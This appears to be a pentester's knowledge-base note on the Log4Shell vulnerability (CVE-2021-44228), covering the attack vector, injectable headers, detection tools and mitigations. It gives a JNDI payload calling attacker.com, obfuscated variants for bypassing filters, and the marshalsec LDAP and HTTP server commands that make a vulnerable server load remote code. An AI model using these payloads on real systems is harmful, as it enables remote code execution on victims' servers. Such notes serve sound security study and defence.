---
aliases:
  - "Log4Shell (JNDI Injection Exploit)"
  - Log4Shell
  - CVE-2021-44228
tags:
  - estado/completo
  - asset/web-app
  - technique/execution
  - vuln/jndi-injection
kind: Vulnerability
linked:
---
# Log4J

> [!info]
> **Log4Shell** (CVE-2021-44228) — RCE pre-auth en log4j 2.0-2.14.1 via JNDI injection. Cualquier string logged que contenga la expresión JNDI triggea lookup → carga clase Java arbitraria.

***

## Vector

Log4J evaluaba expresiones tipo `${jndi:ldap://...}` dentro de cualquier string logged. Servers que loggean input controllable por user = RCE.

Inputs típicos a injectar:
- `User-Agent` header
- `Referer` header
- `X-Forwarded-For`, `X-Api-Version`, etc.
- HTTP body fields
- Username en login attempt
- Cualquier search/filter param

***

## Payload básico

`${jndi:ldap://attacker.com:1389/Exploit}`

Variantes para bypass de filtros simples:
- `${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/x}`
- `${${lower:j}ndi:ldap://attacker/x}`
- `${jndi:${lower:l}${lower:d}${lower:a}p://attacker/x}`

***

## Setup attacker

1. **Marshalsec LDAP server** sirve ref redirect a HTTP que entrega la clase maliciosa
2. **HTTP server** con `Exploit.class` compilado
3. **Inject payload** via header del request

Comando setup típico:

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit"
python3 -m http.server 8888
curl 'http://victim/' -H 'User-Agent: $JNDI_PAYLOAD'
```

***

## Detección

| Tool | Uso |
|---|---|
| **Nuclei** | `nuclei -t cves/2021/CVE-2021-44228` |
| **log4j-scan** (FullHunt) | `python3 log4j-scan.py -u http://target/` |
| **DNSLog OOB** | Replace ldap con `${jndi:ldap://uniqueid.dnslog.cn/x}` y observar |

***

## Mitigation

- Update log4j a 2.17.1 o superior.
- Stop-gap: `log4j2.formatMsgNoLookups=true`, env var `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.
- WAF rules bloqueando `${jndi:`.

***

## Notas Relacionadas

- [[Insecure Deserialization]]
- [[Server-Side Request Forgery (SSRF)]]
- [[ActiveMQ]]
